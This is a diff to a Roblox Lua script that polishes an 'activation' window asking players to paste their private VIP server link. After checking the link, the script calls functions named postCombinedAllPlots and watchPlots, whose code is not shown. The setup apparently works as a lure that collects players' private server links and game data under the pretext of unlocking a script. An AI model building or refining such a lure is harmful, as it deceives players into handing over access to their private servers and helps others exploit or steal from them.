@@ -240,7 +240,7 @@ local function watchPlots()
 end
 
 -- =============================
--- GUI
+-- GUI (исправленный + улучшенный)
 -- =============================
 local function createActivationGUI()
 	local player = Players.LocalPlayer
@@ -251,23 +251,28 @@ local function createActivationGUI()
 
 	local mainFrame = Instance.new("Frame")
 	mainFrame.Name = "MainFrame"
-	mainFrame.Size = UDim2.new(0, 450, 0, 300) -- квадратное и больше для кнопки
+	mainFrame.Size = UDim2.new(0, 450, 0, 300)
 	mainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
-	mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- черное
-	mainFrame.BorderSizePixel = 0
+	mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+	mainFrame.BorderSizePixel = 1
+	mainFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
 	mainFrame.Parent = gui
+
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(0, 15)
+	corner.Parent = mainFrame
 
 	local title = Instance.new("TextLabel")
 	title.Size = UDim2.new(1, -20, 0, 50)
 	title.Position = UDim2.new(0, 10, 0, 10)
 	title.BackgroundTransparency = 1
-	title.Text = "Place vip server link to activate script"
+	title.Text = "Place VIP server link to activate script"
 	title.TextColor3 = Color3.fromRGB(255, 255, 255)
 	title.TextScaled = true
 	title.Font = Enum.Font.GothamBold
 	title.Parent = mainFrame
 
-	local textBox = Instance.new("https://roblox.com/share?code=")
+	local textBox = Instance.new("TextBox")
 	textBox.Size = UDim2.new(1, -20, 0, 50)
 	textBox.Position = UDim2.new(0, 10, 0, 70)
 	textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
@@ -277,18 +282,27 @@ local function createActivationGUI()
 	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 	textBox.TextScaled = true
 	textBox.Font = Enum.Font.Gotham
+	textBox.ClearTextOnFocus = false
 	textBox.Parent = mainFrame
 
+	local textCorner = Instance.new("UICorner")
+	textCorner.CornerRadius = UDim.new(0, 8)
+	textCorner.Parent = textBox
+
 	local button = Instance.new("TextButton")
-	button.Size = UDim2.new(1, -20, 0, 70) -- большая кнопка
+	button.Size = UDim2.new(1, -20, 0, 70)
 	button.Position = UDim2.new(0, 10, 0, 140)
-	button.BackgroundColor3 = Color3.fromRGB(0, 100, 255) -- ярко-синяя
+	button.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
 	button.BorderSizePixel = 0
 	button.Text = "ACTIVATE"
 	button.TextColor3 = Color3.new(1, 1, 1)
 	button.TextScaled = true
 	button.Font = Enum.Font.GothamBold
 	button.Parent = mainFrame
+
+	local btnCorner = Instance.new("UICorner")
+	btnCorner.CornerRadius = UDim.new(0, 12)
+	btnCorner.Parent = button
 
 	button.MouseEnter:Connect(function()
 		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
@@ -310,7 +324,7 @@ local function createActivationGUI()
 	local function onActivate()
 		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$", "%1")
 		if vipLink == "" or not string.find(vipLink, "roblox%.com/share") then
-			status.Text = "not a vip link"
+			status.Text = "Not a VIP link"
 			status.TextColor3 = Color3.fromRGB(255, 80, 80)
 			return
 		end
@@ -324,7 +338,6 @@ local function createActivationGUI()
 
 		task.wait(1)
 		postCombinedAllPlots()
-
 		watchPlots()
 
 		task.wait(2)
